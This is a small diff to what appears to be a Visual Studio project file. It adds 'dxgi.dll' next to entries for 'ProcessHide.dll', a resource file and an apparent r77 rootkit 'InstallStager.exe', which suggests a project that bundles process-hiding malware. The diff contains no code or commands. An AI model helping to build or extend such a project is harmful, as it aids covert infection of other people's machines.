@@ -181,6 +181,7 @@
     <ResourceCompile Include="0x7E9FB-net.rc" />
   </ItemGroup>
   <ItemGroup>
+    <None Include="file\dxgi.dll" />
     <None Include="file\libuv.dll" />
     <None Include="file\ProcessHide.dll" />
     <None Include="hand file\r77\exe file\InstallStager.exe" />
